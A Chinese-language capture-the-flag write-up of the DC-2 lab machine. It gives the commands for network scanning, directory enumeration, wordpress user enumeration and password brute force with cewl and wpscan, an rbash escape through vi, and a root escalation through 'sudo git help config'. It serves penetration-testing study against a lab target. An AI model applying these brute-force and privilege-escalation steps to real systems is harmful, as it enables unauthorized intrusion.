---
title: DC-2实战梳理
date: 2023-05-04 17:20:15
categories: #分类
- 渗透测试
tags: #标签
  - Kali


---



涉及知识点
> 1. 使用 nmap 找寻并扫描靶机。
> 2. 使用 dirsearch 爆破网站目录。
> 3. 使用 cewl 制作字典。
> 4. 使用 wpscan 对 WordPress 站点进行扫描和爆破。
> 5. rbash 绕过
> 6. sudo 提权
> 7. git 提权
> 8. 修改 hosts 文件来访问网站。

<a name="A4Fdn"></a>
# 一、信息收集
<a name="Z5Rqj"></a>
## 1、IP扫描
法1、fping -g 192.168.221.0/24<br />法2、arp-scan -l
>  arp-scan  是一个用来进行系统发现的ARP命令行扫描工具（可以发现本地网络中的隐藏设备）它可以构造并发送ARP请求到指定的IP地址  
> 可以显示本地网络中的所有连接设备，即使这些设备有防火墙。防火墙设备可以屏蔽ping，但是并不能屏蔽ARP数据包。  

法3、nmap -sn 192.168.221.0/24

<a name="cOYIm"></a>
## 2、端口扫描
```python
nmap -T4 -sV -O -A -p- 192.168.221.129
#-T4(速度) 
# -sV(版本扫描和开启的服务) 
# -O(操作系统) 
# -p-（全部端口）

#did not  follow 显示不能跟踪跳转需要设置host
```
<a name="Yq4Rp"></a>
## 3、网站目录扫描
```python
# 法一：使用dirb
dirb http://192.168.221.129
# 或
dirb http://dc-2/

# 法二：使用dirsearch
dirsearch -u http://dc-2/ -e * -x 403 404

    # -u接网站地址
    # -e后接语言，可选php，asp，*（表示全部语言）等
    # -x表示过滤的状态码，扫描出来后不显示该状态
```
<a name="gXRXk"></a>
## 4、网页信息探测
> _下载浏览器插件：Wappalyzer--通过 Wappalyzer 可以识别出网站采用了那种 web 技术。它能够检测出 CMS 和电子商务系统、留言板、javascript 框架，主机面板，分析统计工具和其它的一些 web 系统。The company behind Wappalyzer 还能够收集 web 程序的一些信息用于统计分析，揭示出各种 web 系统的使用率即增长情况。实际 Wappalyzer 就是一个指纹识别工具。_

![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683202962408-73ac3e1b-fe5c-420a-9880-b404c3365c76.png#averageHue=%23cbb398&clientId=u0bcc4f02-dffa-4&from=paste&height=827&id=u8dbf84d7&originHeight=827&originWidth=1310&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=163998&status=done&style=none&taskId=u37de4f1c-897f-4877-a0d7-aa5bf07fee1&title=&width=1310)

<a name="gwmA8"></a>
# 二、漏洞发现
<a name="yKSKv"></a>
## flag1、flag2
1、根据第一步信息收集中的目录扫描，找到登录界面；可以看到登陆需要用户名和密码，我们根据Flag找找线索<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683205505930-2aa8438e-9f65-4c0b-948b-bd88cbb2892a.png#averageHue=%23f2f2f2&clientId=u05675e4b-254f-4&from=paste&height=726&id=NSGpU&originHeight=726&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53147&status=done&style=none&taskId=u03827c84-6e51-4a16-ae85-c637da5a9d8&title=&width=1189)<br />2、根据flag1的内容，提示我们使用cewl制作密码字典
```python
# 将生成的单词列表写入password.txt中
cewl http://dc-2/ -w password.txt
```
2、由于目前只有密码字典，要登陆网站还需要制作用户名字典；该网站是wordpress搭建的，有一个专门对应的漏洞扫描工具--wpscan
```python
# 枚举wordpress站点中注册过的用户名，来制作用户名字典
wpscan --url http://dc-2/ -e u
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206126585-c870b5ad-f1ec-480b-84a4-e3b4e704f735.png#averageHue=%23292f3b&clientId=u05675e4b-254f-4&from=paste&height=359&id=u2b950ae4&originHeight=441&originWidth=667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110194&status=done&style=none&taskId=ue0bb74ab-65ec-41e5-b9d9-2e6b3217305&title=&width=543)<br />3、将上面成功枚举出来的用户名，写入到文件中，作为用户名字典
```python
# 写入user.txt
vim user.txt
```
4、用wpscan调用上面生成的用户名字典和密码字典，对网站进行爆破
```python
wpscan --url http://dc-2/ -U user.txt -P password.txt
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206375271-a11a8a1d-b363-4f78-a544-f17c847ff522.png#averageHue=%23292e39&clientId=u05675e4b-254f-4&from=paste&height=413&id=ue3816cfd&originHeight=496&originWidth=636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125073&status=done&style=none&taskId=u301b860e-b307-4d4e-98f0-9960461af79&title=&width=529)<br />5、成功爆破出用户，尝试使用爆破出来的账号和密码进行登陆；发现只有jerry账号内有pages栏目，且该栏目下找到了flag2<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206653327-ce093618-ba5b-4475-979e-1e02ca5be02a.png#averageHue=%23e9e5d0&clientId=u05675e4b-254f-4&from=paste&height=758&id=ud57b91b6&originHeight=758&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182377&status=done&style=none&taskId=uc675de68-e6b1-4b15-ab23-a07ce44cfef&title=&width=1447)
<a name="aK5yw"></a>
## flag3
ssh登陆服务器，发现只有tom用户能登进去，ls看到有flag3.txt，此时直接vi flag3.txt。提示切换用户
```python
# 一、SSH登录到远程靶机
ssh -p 7744 tom@192.168.221.129
# 二、发现是rbash
# 三、查看可以使用哪些命令
echo $PATH
ls <上一个命令输出的路径>
# 四、用ls查看，发现了flag.txt,直接用vi
```

<a name="K8cDq"></a>
## flag4
根据flag3提示切换用户，但当前无法使用su命令，所以尝试用rbash绕过
<a name="VGomS"></a>
### rbash逃逸
```php
// 一、可以使用vi命令，通过设置shell变量的方式实现逃逸
// 1、vi进入文件中
// 2、输入
:set shell=/bin/sh
  
// 3、回车后输入
：shell
  
// 4、此时成功进入shell
// 即rbash逃逸成功，但此时有些命令还是无法执行，因为现在只是绕过了rbash的限制，用户权限还是普通用户
// 有很多的命令会出现路径异常，可以用echo $PATH查看当前的搜索路径
  
// 5、先看看我们正常的root权限的PATH是什么值
──(root㉿kali)-[/home/kali]
└─# echo $PATH                            
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

// 6、将上面的值复制，在目标机上修改
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
// 也可以用 
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
// 如果要替换的话用
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```
<a name="ZKTcZ"></a>
### 切换用户
逃逸成功后加上权限，此时可以使用su切换用户
```php
// 切换用户并输入前面暴破出来的密码
su jerry

// 登陆成功后 进去用户目录,发现flag4.txt,直接cat查看
  cd /home/jerry
  ls
```
flag4提示git提权
<a name="DMZjG"></a>
## final-flag
```php
// 查看当前用户可以以root身份执行的命令
sudo -l

// 发现可以执行git命令，所以可以利用git 提权
  sudo git help config
  !/bin/bash
// 此时已经提权成功了，可以用whoami验证下，显示为root
  whoami
// 进入/root/，发现flag.
  cd /root
  ls
  
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683471227451-bcd3b41b-2adb-4ac3-be1e-025331658613.png#averageHue=%23272b39&clientId=u92967187-204d-4&from=paste&height=168&id=udb06f95e&originHeight=168&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44088&status=done&style=none&taskId=ufc5a77ee-6507-4887-99a5-7f3f7367c54&title=&width=664)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/25987745/1683471854013-f8b2d396-cdca-4b10-8f5b-8122b9408ceb.png#averageHue=%23262a36&clientId=u92967187-204d-4&from=paste&height=431&id=ue8d9ce7c&originHeight=431&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98855&status=done&style=none&taskId=u75cdd879-4622-48d2-92da-793e9473983&title=&width=553)

渗透结束
